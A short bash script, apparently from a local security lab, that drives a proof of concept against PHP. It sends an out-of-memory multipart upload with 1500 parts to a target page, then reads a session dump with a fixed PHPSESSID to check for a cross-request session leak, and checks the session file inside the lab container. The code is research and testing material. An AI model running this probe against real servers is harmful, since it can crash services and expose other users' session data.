#!/usr/bin/env bash
# OOM multipart POST, then GET session_dump.php (same PHPSESSID) — 109619 cross-request read.
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROBE="${PROBE:-$SCRIPT_DIR/oom_rfc1867_http_probe.py}"
HOST="${1:-127.0.0.1}"
PORT="${2:-8080}"
COOKIE='PHPSESSID=abcdef0123456789abcdef0123456789'
OUT="${OUT:-$HOME/blackhole-captures/post-oom-session-$(date +%Y%m%d-%H%M%S).txt}"

mkdir -p "$(dirname "$OUT")"
exec > >(tee "$OUT") 2>&1
echo "=== post-oom session probe $(date -Is) ==="

echo "--- step 1: OOM POST ---"
python3 "$PROBE" --host "$HOST" --port "$PORT" --path /oom_target.php \
  --scenario progress-many-parts --parts 1500 --label sess-oom --timeout 60 || true

echo "--- step 2: GET session_dump.php (timeout 20s) ---"
timeout 20 curl -fsS --max-time 20 -H "Cookie: $COOKIE" \
  "http://${HOST}:${PORT}/session_dump.php" || echo "SESSION_DUMP=timeout_or_error"

echo "--- step 3: container sess file size ---"
podman exec blackhole-lab_web_1 wc -c /tmp/sess_abcdef0123456789abcdef0123456789 2>/dev/null || echo "no_sess_file"

echo "wrote $OUT"
